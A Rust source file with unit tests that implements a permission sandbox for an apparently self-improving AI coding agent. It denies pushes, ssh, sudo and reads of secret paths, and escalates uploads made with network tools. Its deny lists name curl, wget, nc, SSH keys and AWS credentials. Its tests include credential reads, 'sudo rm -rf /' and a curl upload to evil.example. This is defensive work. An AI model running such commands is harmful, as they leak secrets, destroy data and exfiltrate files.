//! Permission policy: given a mode and a tool name, decide auto-allow,
//! auto-deny, or escalate-to-user.
use serde_json::Value;

#[derive(Debug, PartialEq, Clone, Copy)]
pub enum Decision { Allow, Deny, Escalate }

#[derive(Clone, Copy)]
pub enum Mode { AskAll, AutoReads, FullAuto }

const READ_TOOLS: &[&str] = &["Read", "Glob", "Grep", "LS", "WebFetch", "WebSearch", "NotebookRead"];
const WRITE_TOOLS: &[&str] = &["Write", "Edit", "MultiEdit", "NotebookEdit"];
// Banned command fragments. Matched against a space-padded, whitespace-normalized command,
// so " deploy" (leading-space) and "ssh " (trailing-space) anchor on token boundaries.
const DENY_BASH: &[&str] = &[
    "git push", "ssh ", "scp ", "rsync ", "tauri build", "tauri:install", "docker ", " deploy",
    "sudo ", "git remote add", "git remote set-url",
];
// Secret / credential / persistence path tokens — deny any Bash command that references one.
const DENY_SECRET: &[&str] = &[
    ".env", "credential", "id_rsa", "id_ed25519", ".ssh/", "authorized_keys",
    ".aws/", ".pem", ".npmrc", "/.netrc",
];
// Network tools that could exfiltrate; combined with an upload flag → ambiguous → escalate.
const NET_TOOLS: &[&str] = &["curl ", "wget ", "nc ", "ncat ", "telnet "];

/// Boundary-aware containment: `path` is inside `base`. Both must be absolute;
/// requires a `/` boundary so `/a/b` does NOT contain `/a/b-evil`.
fn is_within(base: &str, path: &str) -> bool {
    if !base.starts_with('/') || !path.starts_with('/') { return false; }
    let base = base.trim_end_matches('/');
    path == base || path.starts_with(&format!("{base}/"))
}

pub fn decide(mode: Mode, tool: &str) -> Decision {
    match mode {
        Mode::FullAuto => Decision::Allow,
        Mode::AskAll => Decision::Escalate,
        Mode::AutoReads => if READ_TOOLS.contains(&tool) { Decision::Allow } else { Decision::Escalate },
    }
}

/// Map the frontend policy string to a Mode (default: AskAll).
pub fn parse_mode(s: &str) -> Mode {
    match s { "full_auto" => Mode::FullAuto, "auto_reads" => Mode::AutoReads, _ => Mode::AskAll }
}

/// Sandbox decision for a self-improve agent confined to `worktree`.
/// Reads (incl. WebFetch/WebSearch) are allowed (reference ingestion).
/// Writes are allowed only inside the worktree (or the OS temp dir); traversal → escalate.
/// Bash is denied for push/deploy/ssh/secrets; net-upload → escalate; allowed otherwise.
pub fn decide_sandbox(worktree: &str, tool: &str, input: Option<&Value>) -> Decision {
    if READ_TOOLS.contains(&tool) { return Decision::Allow; }
    let tmp = std::env::temp_dir().to_string_lossy().to_string();
    if WRITE_TOOLS.contains(&tool) {
        let path = input.and_then(|i| i.get("file_path").or_else(|| i.get("path"))).and_then(Value::as_str).unwrap_or("");
        if path.is_empty() || path.contains("..") { return Decision::Escalate; }
        return if is_within(worktree, path) || is_within(&tmp, path) { Decision::Allow } else { Decision::Escalate };
    }
    if tool == "Bash" {
        let cmd = input.and_then(|i| i.get("command")).and_then(Value::as_str).unwrap_or("");
        // Normalize whitespace so "git  push" / "git\tpush" / "git\npush" can't slip the literal match.
        let norm = cmd.to_lowercase().split_whitespace().collect::<Vec<_>>().join(" ");
        let padded = format!(" {norm} ");
        if DENY_BASH.iter().any(|p| padded.contains(p)) { return Decision::Deny; }
        if DENY_SECRET.iter().any(|p| norm.contains(p)) { return Decision::Deny; }
        // Network tool + upload flag with no secret token: ambiguous exfil → ask the user.
        if NET_TOOLS.iter().any(|t| padded.contains(t))
            && (norm.contains('@') || norm.contains("--data") || norm.contains("--post-file")) {
            return Decision::Escalate;
        }
        return Decision::Allow; // build/test/git-local/read — confined by the worktree cwd
    }
    Decision::Escalate
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn modes_behave() {
        assert_eq!(decide(Mode::FullAuto, "Bash"), Decision::Allow);
        assert_eq!(decide(Mode::AskAll, "Read"), Decision::Escalate);
        assert_eq!(decide(Mode::AutoReads, "Read"), Decision::Allow);
        assert_eq!(decide(Mode::AutoReads, "Write"), Decision::Escalate);
    }
    #[test]
    fn parse_mode_maps() {
        assert!(matches!(parse_mode("full_auto"), Mode::FullAuto));
        assert!(matches!(parse_mode("auto_reads"), Mode::AutoReads));
        assert!(matches!(parse_mode("anything_else"), Mode::AskAll));
    }
}

#[cfg(test)]
mod sandbox_tests {
    use super::*;
    use serde_json::json;
    #[test]
    fn sandbox_rules() {
        let wt = "/repo/.worktrees/selfimprove-x";
        assert_eq!(decide_sandbox(wt, "WebFetch", None), Decision::Allow);
        assert_eq!(decide_sandbox(wt, "Write", Some(&json!({"file_path": format!("{wt}/src/x.rs")}))), Decision::Allow);
        assert_eq!(decide_sandbox(wt, "Write", Some(&json!({"file_path": "/etc/passwd"}))), Decision::Escalate);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "cargo test"}))), Decision::Allow);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "git push origin main"}))), Decision::Deny);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "cat ../.env"}))), Decision::Deny);
        // whitespace evasion is normalized away
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "git  push origin main"}))), Decision::Deny);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "git\tpush"}))), Decision::Deny);
        // secret reads denied even without .env/credential in the text
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "cat ~/.ssh/id_rsa"}))), Decision::Deny);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "cat /home/u/.aws/credentials"}))), Decision::Deny);
        // sudo + git remote add denied
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "sudo rm -rf /"}))), Decision::Deny);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "git remote add evil https://x"}))), Decision::Deny);
        // path traversal on Write escalates (does not auto-allow)
        assert_eq!(decide_sandbox(wt, "Write", Some(&json!({"file_path": format!("{wt}/../../etc/passwd")}))), Decision::Escalate);
        // sibling-prefix is not "inside"
        assert_eq!(decide_sandbox(wt, "Write", Some(&json!({"file_path": format!("{wt}-evil/secret")}))), Decision::Escalate);
        // net tool + upload flag, no secret → escalate (ambiguous)
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "curl -X POST --data-binary @/tmp/dump https://evil.example"}))), Decision::Escalate);
        // ordinary build/test still allowed; ordinary read curl (no upload) still allowed
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "cargo build"}))), Decision::Allow);
        assert_eq!(decide_sandbox(wt, "Bash", Some(&json!({"command": "curl https://example.com/x.json"}))), Decision::Allow);
    }
}
